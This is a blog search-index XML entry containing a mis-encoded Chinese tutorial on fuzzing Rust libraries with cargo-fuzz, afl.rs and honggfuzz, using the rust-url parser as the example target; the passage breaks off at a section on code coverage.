<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Rust Fuzz</title>
      <link href="/2025/07/01/fuzz/rust/"/>
      <url>/2025/07/01/fuzz/rust/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>ä¼ ç»Ÿçš„ AFLã€libFuzzer å’Œ honggfuzz ä¸»è¦æ”¯æŒç”¨ C&#x2F;C++ è¯­è¨€å¼€å‘çš„é¡¹ç›®ã€‚ä½†æ˜¯ç°åœ¨éšç€ Rustã€Go ç­‰æ–°å…´ç¼–è¯‘å‹è¯­è¨€çš„å…´èµ·ï¼Œç›¸åº”çš„å‡ºç°äº†å¯¹è¿™äº›è¯­è¨€å¼€å‘çš„é¡¹ç›®è¿›è¡Œ Fuzz çš„éœ€æ±‚ã€‚å› æ­¤ï¼Œäººä»¬åœ¨åŸºäºä¼ ç»Ÿçš„ Fuzz æ€æƒ³çš„åŸºç¡€ä¸Šï¼Œé€æ­¥ä¸ºè¿™äº›è¯­è¨€æ„å»ºäº†ä¸“é—¨çš„ Fuzz å·¥å…·ã€‚æœ¬æ–‡æ‰€è¦å­¦ä¹ çš„ cargo-fuzz å’Œ afl.rs æ­£æ˜¯å¦‚æ­¤ã€‚</p><h2 id="cargo-fuzz"><a href="#cargo-fuzz" class="headerlink" title="cargo-fuzz"></a>cargo-fuzz</h2><p>cargo-fuzz æ˜¯ Rust ä»£ç æ¨¡ç³Šæµ‹è¯•çš„æ¨èå·¥å…·ã€‚ä¸è¿‡ï¼Œcargo-fuzz æœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ª fuzzerï¼Œè€Œæ˜¯ä¸€ä¸ªè°ƒç”¨ fuzzer çš„å·¥å…·ã€‚ç›®å‰ï¼Œå®ƒä»…ä»…æ”¯æŒé€šè¿‡ libfuzzer-sys crate è°ƒç”¨ LibFuzzerã€‚</p><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ç”±äº libFuzzer éœ€è¦ LLVM sanitizer æ”¯æŒï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°† Rust ç¼–è¯‘å™¨åˆ‡æ¢è‡³ nightly ç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">rustup default<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">å®‰è£…nightlyç‰ˆæœ¬</span><br>rustup install nightly<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">è®¾ç½®ä¸ºé»˜è®¤ç¼–è¯‘å™¨</span><br>rustup default nightly<br><span class="hljs-meta prompt_"># </span><span class="language-bash">æ­£ç¡®è¾“å‡ºç¤ºä¾‹ï¼š</span><br>nightly-x86_64-unknown-linux-gnu (default)<br></code></pre></td></tr></table></figure><ul><li>å®‰è£… cargo-fuzz å·¥å…·</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo install cargo-fuzz<br></code></pre></td></tr></table></figure><h3 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°†å¯¹ Rust çš„ URL è§£æåº“ Â <a href="https://github.com/servo/rust-url">rust-url</a>Â è¿›è¡Œ Fuzzï¼Œç›®æ ‡å°±æ˜¯æ‰¾åˆ°ä½¿å…¶å´©æºƒçš„ crashã€‚</p><ul><li>ç¯å¢ƒæ­å»º</li></ul><p>é¦–å…ˆï¼Œå…‹éš† rust-url é¡¹ç›®å¹¶åˆ‡æ¢æŒ‡å®šæäº¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/servo/rust-url.git<br>cd rust-url<br><br>git checkout bfa167b4e0253642b6766a7aa74a99df60a94048<br></code></pre></td></tr></table></figure><p>åˆå§‹åŒ– Fuzz ç¯å¢ƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo fuzz init<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ç°æœ‰çš„ fuzz ç›®æ ‡</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">cargo fuzz list</span><br></code></pre></td></tr></table></figure><p><img src="/Linux/assets/Pasted%20image%2020250613132204.png"></p><ul><li>é…ç½®æµ‹è¯•ç›®æ ‡</li></ul><p>ç¼–è¾‘é»˜è®¤ç”Ÿæˆçš„æµ‹è¯•æ–‡ä»¶<code>fuzz-targets/fuzz_target_1.rs</code>ï¼Œä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![no_main]</span><br><span class="hljs-meta">#[macro_use]</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> libfuzzer_sys;<br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> url;<br><br>fuzz_target!(|data: &amp;[<span class="hljs-type">u8</span>]| &#123;<br>    <span class="hljs-comment">// ä½ çš„æ¨¡ç³Šæµ‹è¯•ä»£ç </span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Ok</span>(s) = std::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(data) &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">_</span> = url::Url::<span class="hljs-title function_ invoke__">parse</span>(s);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><blockquote><p><code>fuzz_target!</code>æ˜¯ cargo-fuzz æä¾›çš„å®ï¼Œç”¨äºå®šä¹‰ Fuzz å…¥å£ã€‚libFuzzer ä¼šæŒç»­è°ƒç”¨å®ƒï¼Œå¹¶ä¼ å…¥ç”Ÿæˆçš„æ•°æ®ã€‚ç±»ä¼¼äº C&#x2F;C++ ä¸­çš„<code>LLVM</code></p></blockquote><ul><li>å¼€å§‹Fuzz</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo fuzz run fuzz_target_1<br></code></pre></td></tr></table></figure><p>åœ¨è·‘äº†ä¸€ä¼šä¹‹åç¨‹åºå°±ç›´æ¥ crash äº†ï¼Œå¹¶å°†crash æ ·æœ¬ä¿å­˜åˆ°äº†ã€‚</p><p><img src="/Linux/assets/Pasted%20image%2020250613133117.png"></p><ul><li>ä½¿ç”¨ä¿å­˜çš„ crash è°ƒè¯•</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">RUST_BACKTRACE=1 cargo fuzz run &lt;target-name&gt; &lt;path/to/crash&gt;<br></code></pre></td></tr></table></figure><ul><li>cargo fuzz add targetï¼šåˆ›å»ºæ–°çš„æ¨¡ç³Šæµ‹è¯•ç›®æ ‡</li><li>cargo fuzz run targetï¼šè¿è¡Œæ¨¡ç³Šæµ‹è¯•ç›®æ ‡</li><li>cargo fuzz fmt target inputï¼šæ‰“å°æµ‹è¯•ç”¨ä¾‹çš„è¾“å…¥</li><li>cargo fuz tmin target inputï¼šå‘é€è¾“å…¥å¤±è´¥ï¼Ÿç¼©å°åˆ°æœ€å°è¾“å…¥</li><li>cargo fuzz cmin targetï¼šç¼©å°è¾“å…¥è¯­æ–™åº“</li><li>cargo fuzz coverageï¼šç”Ÿæˆè¦†ç›–ç‡ä¿¡æ¯</li></ul><h3 id="libFuzzerå‚æ•°"><a href="#libFuzzerå‚æ•°" class="headerlink" title="libFuzzerå‚æ•°"></a>libFuzzerå‚æ•°</h3><p>é€šè¿‡<code>--</code>å‘ libFuzzer ä¼ å‚ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo fuzz run target_name -- -max_len=512 -only_ascii=1<br></code></pre></td></tr></table></figure><p>å‚æ•°ï¼š</p><ul><li><code>-ignore_crashes=1</code>ï¼šå³ä½¿é‡åˆ°å´©æºƒä¹Ÿç»§ç»­ Fuzzã€‚</li><li><code>-s,--sanitizer</code>ï¼šé€‰æ‹© Sanitizerã€‚</li><li><code>-max_len=&lt;len&gt;</code>ï¼šé™åˆ¶è¾“å…¥æœ€å¤§é•¿åº¦ã€‚</li><li><code>-runs=&lt;number&gt;</code>ï¼šé™åˆ¶è¿è¡Œæ¬¡æ•°ã€‚</li><li><code>-max_total_time=&lt;sec&gt;</code>ï¼šé™åˆ¶æ€»è¿è¡Œæ—¶é—´ï¼ˆç§’ï¼‰ã€‚</li><li><code>-timeout=&lt;sec&gt;</code>ï¼šå•æ¬¡è¿è¡Œè¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰ã€‚</li><li><code>-only_ascii=1</code>ï¼šä»…ç”Ÿæˆ ASCII è¾“å…¥ã€‚</li><li><code>-dict=&lt;file&gt;</code>ï¼šä½¿ç”¨å­—å…¸æ–‡ä»¶ã€‚</li><li><code>-c, --careful</code>ï¼šå¼€å¯é¢å¤–çš„å®‰å…¨æ£€æŸ¥ã€‚</li><li><code>--no-cfg-fuzzing</code>ï¼šç¦ç”¨é»˜è®¤çš„<code>cfg(fuzzing)</code>ç¼–è¯‘é…ç½®ã€‚</li></ul><h2 id="afl-rs"><a href="#afl-rs" class="headerlink" title="afl.rs"></a>afl.rs</h2><p><code>afl.rs</code>æ˜¯åŸºäº AFLï¼ˆAmerican Fuzzy Lopï¼‰ çš„ä¸€ä¸ª Rust è¯­è¨€ Fuzz æ¡†æ¶ï¼Œå®ƒå…è®¸ä½ åœ¨ Rust é¡¹ç›®ä¸­å¤ç”¨ AFL å¼ºå¤§çš„å˜å¼‚å¼•æ“å’Œå´©æºƒæ£€æµ‹èƒ½åŠ›ã€‚</p><h3 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><ul><li>cargo å®‰è£…</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo install cargo-afl<br></code></pre></td></tr></table></figure><ul><li>æºç å®‰è£…</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/rust-fuzz/afl.rs<br>cd afl.rs<br>git submodule update --init<br>cargo install --path cargo-afl<br></code></pre></td></tr></table></figure><p>å¦‚æœ cargo-afl å‡ºç°å´©æºƒï¼Œå¯ä»¥å°è¯•æ·»åŠ <code>--debug</code>å‚æ•°å®‰è£…ã€‚</p><h3 id="åŸºç¡€ç”¨æ³•"><a href="#åŸºç¡€ç”¨æ³•" class="headerlink" title="åŸºç¡€ç”¨æ³•"></a>åŸºç¡€ç”¨æ³•</h3><p>åŒæ ·ä»¥ URL è§£æåº“ Â <a href="https://github.com/servo/rust-url">rust-url</a> ä¸ºä¾‹ã€‚</p><ul><li>ç¯å¢ƒæ­å»º</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo new --bin url-fuzz-target<br>cd url-fuzz-target<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦åœ¨è¯¥é¡¹ç›®ä¸­æ·»åŠ ä¸¤ä¸ªä¾èµ–é¡¹ï¼š</p><ul><li><code>url</code>ï¼šæˆ‘ä»¬è¦æµ‹è¯•çš„åº“</li><li><code>afl</code>ï¼šæä¾›äº†ä¸€äº›è¾…åŠ©å‡½æ•°ï¼Œå¸®åŠ©ç¼–å†™æ¨¡ç³Šæµ‹è¯•ç›®æ ‡</li></ul><p>å°†è¿™äº›æ·»åŠ åˆ°<code>Cargo.toml</code>æ–‡ä»¶ä¸­</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs toml"><span class="hljs-section">[dependencies]</span><br><span class="hljs-attr">afl</span> = <span class="hljs-string">&quot;*&quot;</span><br><span class="hljs-attr">url</span> = &#123; git = <span class="hljs-string">&quot;https://github.com/servo/rust-url.git&quot;</span>, rev = <span class="hljs-string">&quot;bfa167b4e0253642b6766a7aa74a99df60a94048&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>ç¼–å†™æ¨¡ç³Šæµ‹è¯•æºæ–‡ä»¶ï¼š<code>src/main.rs</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#[macro_use]</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> afl;<br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> url;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    fuzz!(|data: &amp;[<span class="hljs-type">u8</span>]| &#123;<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Ok</span>(s) = std::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(data) &#123;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">_</span> = url::Url::<span class="hljs-title function_ invoke__">parse</span>(&amp;s);<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>fuzz!</code>å®ä¼šä» AFL è¿è¡Œæ—¶æä¾›çš„æ ‡å‡†è¾“å…¥ä¸­è¯»å–æ•°æ®æŠ•å–‚ç»™ç›®æ ‡ç¨‹åºã€‚<code>fuzz!</code>å®å†…éƒ¨ç”¨<code>catch_unwind</code>æ•è· panicï¼Œç¡®ä¿æ‹¦æˆª panic ä¸è‡³äºç›´æ¥è®© Fuzz è¿›ç¨‹é€€å‡ºã€‚</p></blockquote><ul><li>æ„å»ºç›®æ ‡</li></ul><p>é€šå¸¸ï¼Œäººä»¬ç”¨æ¥ç¼–è¯‘ä¸€ä¸ªåŸºäº Cargo çš„ Rust é¡¹ç›®ã€‚è¦è®© AFL ä¸ Rust ä¸€èµ·å·¥ä½œï¼Œéœ€è¦åœ¨æ„å»ºè¿‡ç¨‹ä¸­å°†ä¸€äº›é¢å¤–çš„ç¼–è¯‘å™¨æ ‡å¿—ä¼ é€’ç»™ rustcã€‚ä¸ºäº†ç®€åŒ–è¿™ä¸€ç‚¹ï¼Œæœ‰ä¸€ä¸ª AFL cargo å­å‘½ä»¤ï¼ˆç”± crate æä¾›ï¼‰å¯ä»¥è‡ªåŠ¨ä¸ºæˆ‘ä»¬ä¼ é€’è¿™äº› rustc æ ‡å¿—ã€‚è¦ä½¿ç”¨å®ƒï¼Œæ‚¨éœ€è¦æ‰§è¡Œä»¥ä¸‹ä½œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo afl build<br><span class="hljs-meta prompt_">#</span><span class="language-bash">å¦‚æœæŠ¥é”™FL LLVM runtime was not built <span class="hljs-keyword">for</span> Rust rustc-1.89.0-nightly-99e7c15; run `cargo afl config --build` to build it.</span><br>cargo afl config --build<br></code></pre></td></tr></table></figure><ul><li>åˆ›å»ºç§å­</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir in<br>echo &quot;tcp://example.com/&quot; &gt; in/url<br>echo &quot;ssh://192.168.1.1&quot; &gt; in/url2<br>echo &quot;http://www.example.com:80/foo?hi=bar&quot; &gt; in/url3<br></code></pre></td></tr></table></figure><ul><li>å¼€å§‹Fuzz</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo afl fuzz -i in -o out target/debug/url-fuzz-target<br></code></pre></td></tr></table></figure><p><img src="/Linux/assets/Pasted%20image%2020250613140012.png"></p><ul><li>å¤ç°crash</li></ul><p>åœ¨è¿è¡Œæ¨¡ç³Šæµ‹è¯•ç¨‹åºä¸­æ”¶é›†åˆ°ä¸€äº›å´©æºƒåï¼Œæ‚¨å¯ä»¥é€šè¿‡æ‰‹åŠ¨å°†å®ƒä»¬ä¼ é€’åˆ°æµ‹è¯•ç”¨ä¾‹æ¥é‡ç°å®ƒä»¬ã€‚è¿™é€šå¸¸æ˜¯é€šè¿‡ .ä¾‹å¦‚ï¼Œå‘½ä»¤å°†æ˜¯ï¼š<code>stdin</code> <code>url-fuzz-target</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo afl run url-fuzz-target &lt; out/default/crashes/crash_file<br></code></pre></td></tr></table></figure><p>å…¶ä¸­æ˜¯ fuzz å‘½ä»¤ä¸­çš„å‚æ•°ï¼Œæ˜¯ç›®å½•ä¸­çš„ä»»æ„æ–‡ä»¶ã€‚<code>out</code> <code>-o</code> <code>crash_file</code> <code>crashes</code></p><h3 id="AFLçš„æ”¯æŒ"><a href="#AFLçš„æ”¯æŒ" class="headerlink" title="AFLçš„æ”¯æŒ"></a>AFLçš„æ”¯æŒ</h3><p><code>afl.rs</code>æœ¬è´¨ä¸Šæ˜¯ AFL æ¨¡ç³Šæµ‹è¯•åœ¨ Rust é‡Œçš„æ¥å£ï¼Œå®ƒæœ¬èº«ä¸ç›´æ¥è§£ææˆ–ç®¡ç† AFL çš„å‘½ä»¤è¡Œå‚æ•°ã€‚AFL çš„å‚æ•°ä¸»è¦ç”± AFL æˆ– AFL++ çš„äºŒè¿›åˆ¶æ¨¡ç³Šæµ‹è¯•å™¨ï¼ˆå¦‚ <code>afl-fuzz</code>ï¼‰æ¥å¤„ç†ï¼Œ<code>afl.rs</code>åªæ˜¯æä¾› Rust ä»£ç é‡Œçš„æ¥å£ï¼Œè®©ç¨‹åºèƒ½æ¥æ”¶ AFL ä¼ å…¥çš„è¾“å…¥ï¼Œé…åˆ AFL çš„è¿è¡Œã€‚</p><p>æˆ‘ä»¬åŒæ ·å¯ä»¥åœ¨ afl.rs ä¸Šä½¿ç”¨å¾ˆå¤š AFL çš„åŠŸèƒ½ï¼Œå¦‚å­—å…¸ã€è¾“å…¥ä¼˜åŒ–ã€æŒä¹…æ¨¡å¼ã€‚å»¶è¿Ÿæ’æ¡©ã€‚å¹¶è¡Œã€‚é»‘ç›’ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">cargo afl fuzz -i <span class="hljs-keyword">in</span> -o <span class="hljs-keyword">out</span> -x dict.txt <span class="hljs-keyword">target</span>/debug/your-fuzz-<span class="hljs-keyword">target</span><br></code></pre></td></tr></table></figure><ul><li><code>-x</code>ï¼šæŒ‡å®šå­—å…¸æ–‡ä»¶</li></ul><p>å¹¶è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo afl fuzz -i in -o out -S fuzzer01 target/debug/your-fuzz-target<br>cargo afl fuzz -i in -o out -S fuzzer02 target/debug/your-fuzz-target<br></code></pre></td></tr></table></figure><p>å¼€å¯ ASanï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">RUSTFLAGS=&quot;-Z sanitizer=address&quot; cargo afl build<br>ASAN_OPTIONS=detect_leaks=0 cargo afl fuzz -i in -o out target/debug/your-fuzz-target<br></code></pre></td></tr></table></figure><h4 id="æŒä¹…æ¨¡å¼"><a href="#æŒä¹…æ¨¡å¼" class="headerlink" title="æŒä¹…æ¨¡å¼"></a>æŒä¹…æ¨¡å¼</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">input</span> = <span class="hljs-built_in">vec!</span>[];<br><span class="hljs-keyword">loop</span> &#123;<br>    afl::<span class="hljs-title function_ invoke__">read_stdio_into</span>(&amp;<span class="hljs-keyword">mut</span> input);<br>    <span class="hljs-comment">// æµ‹è¯•ä»£ç ...</span><br>    input.<span class="hljs-title function_ invoke__">clear</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="honggfuzz"><a href="#honggfuzz" class="headerlink" title="honggfuzz"></a>honggfuzz</h2><p>ç¡®ä¿å·²å®‰è£…ä»¥ä¸‹å·¥å…·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cargo install honggfuzz<br><span class="hljs-built_in">sudo</span> apt install libunwind-dev  <span class="hljs-comment"># Linux ä¸Šç”¨äºå›æº¯è§£æ</span><br></code></pre></td></tr></table></figure><blockquote><p>âœ… æ¨èå®‰è£…ï¼š<code>honggfuzz-rs</code> æ˜¯ Rust å¯¹ honggfuzz çš„ç»‘å®šå’Œè¾…åŠ©é›†æˆåº“ã€‚</p></blockquote><hr><h3 id="é¡¹ç›®ç»“æ„è®¾ç½®"><a href="#é¡¹ç›®ç»“æ„è®¾ç½®" class="headerlink" title="é¡¹ç›®ç»“æ„è®¾ç½®"></a>é¡¹ç›®ç»“æ„è®¾ç½®</h3><ol><li>æ·»åŠ ä¾èµ–ï¼ˆ<code>Cargo.toml</code>ï¼‰</li></ol><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs toml"><span class="hljs-section">[dependencies]</span><br><span class="hljs-attr">honggfuzz</span> = <span class="hljs-string">&quot;0.5&quot;</span><br></code></pre></td></tr></table></figure><hr><p>åˆ›å»º <code>fuzz/fuzz_target.rs</code>ï¼ˆæˆ–å…¶ä»–åå­—ï¼‰</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">loop</span> &#123;<br>        honggfuzz::fuzz!(|data: &amp;[<span class="hljs-type">u8</span>]| &#123;<br>            <span class="hljs-comment">// æ›¿æ¢ä¸ºä½ è‡ªå·±çš„ç›®æ ‡é€»è¾‘ï¼Œæ¯”å¦‚è§£æã€ååºåˆ—åŒ–ã€å‹ç¼©ç­‰</span><br>            <span class="hljs-keyword">if</span> data.<span class="hljs-title function_ invoke__">starts_with</span>(<span class="hljs-string">b&quot;FUZZ&quot;</span>) &#123;<br>                <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;Found FUZZ prefix!&quot;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>honggfuzz::fuzz!</code> æ˜¯å®ï¼Œè´Ÿè´£ä»å…±äº«å†…å­˜è¯»å–è¾“å…¥æ•°æ®ï¼Œå¹¶æ‰§è¡Œä½ æä¾›çš„é—­åŒ…ã€‚</p></blockquote><hr><h3 id="3-é…ç½®å¯æ‰§è¡Œç›®æ ‡ï¼ˆCargo-toml-ä¸­åŠ å…¥ï¼‰"><a href="#3-é…ç½®å¯æ‰§è¡Œç›®æ ‡ï¼ˆCargo-toml-ä¸­åŠ å…¥ï¼‰" class="headerlink" title="3. é…ç½®å¯æ‰§è¡Œç›®æ ‡ï¼ˆCargo.toml ä¸­åŠ å…¥ï¼‰"></a>3. é…ç½®å¯æ‰§è¡Œç›®æ ‡ï¼ˆ<code>Cargo.toml</code> ä¸­åŠ å…¥ï¼‰</h3><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs toml"><span class="hljs-section">[[bin]]</span><br><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;fuzz_target&quot;</span><br><span class="hljs-attr">path</span> = <span class="hljs-string">&quot;fuzz/fuzz_target.rs&quot;</span><br></code></pre></td></tr></table></figure><hr><p>ç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cargo build --release<br></code></pre></td></tr></table></figure><hr><p>å¼€å§‹ Fuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">honggfuzz -i <span class="hljs-keyword">in</span>/ -o out/ -- ./target/release/fuzz_target<br></code></pre></td></tr></table></figure><ul><li><p><code>-i in/</code>ï¼šè¾“å…¥ç§å­ç›®å½•ï¼ˆå¯ä»¥ä¸ºç©ºï¼‰</p></li><li><p><code>-o out/</code>ï¼šè¾“å‡ºå´©æºƒ&#x2F;æŒ‚èµ·æ ·æœ¬ä¿å­˜ç›®å½•</p></li><li><p><code>-- ./target/release/fuzz_target</code>ï¼šè¿è¡Œç›®æ ‡ç¨‹åº</p></li></ul><p>ä½ å¯ä»¥å…ˆåˆ›å»ºç©ºè¾“å…¥ç›®å½•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-keyword">in</span> out<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;test&quot;</span> &gt; <span class="hljs-keyword">in</span>/seed1<br></code></pre></td></tr></table></figure><hr><p>æ·»åŠ ä¾èµ–ï¼š</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs toml"><span class="hljs-section">[dependencies]</span><br><span class="hljs-attr">serde</span> = &#123; version = <span class="hljs-string">&quot;1.0&quot;</span>, features = [<span class="hljs-string">&quot;derive&quot;</span>] &#125;<br><span class="hljs-attr">serde_json</span> = <span class="hljs-string">&quot;1.0&quot;</span><br><span class="hljs-attr">honggfuzz</span> = <span class="hljs-string">&quot;0.5&quot;</span><br></code></pre></td></tr></table></figure><hr><p>å…¶ä»–åŠŸèƒ½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexdump -C out/INPUT_*.fuzz<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç”¨ä½ çš„ target æ‰‹åŠ¨é‡ç°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> out/INPUT_000000.fuzz | ./target/release/fuzz_target<br></code></pre></td></tr></table></figure><hr><p>å¤šçº¿ç¨‹ &#x2F; è‡ªå®šä¹‰ Corpus è·¯å¾„</p><p>ä½ å¯ä»¥ä½¿ç”¨å¤šçº¿ç¨‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">HFUZZ_RUN_ARGS=<span class="hljs-string">&quot;--threads 4&quot;</span> cargo run --release --bin fuzz_target<br></code></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨æ‰‹åŠ¨ corpusï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">HFUZZ_RUN_ARGS=<span class="hljs-string">&quot;-i corpus -o crashes&quot;</span> cargo run --release --bin fuzz_target<br></code></pre></td></tr></table></figure><h2 id="æµ‹é‡ä»£ç è¦†ç›–ç‡"><a href="#æµ‹é‡ä»£ç 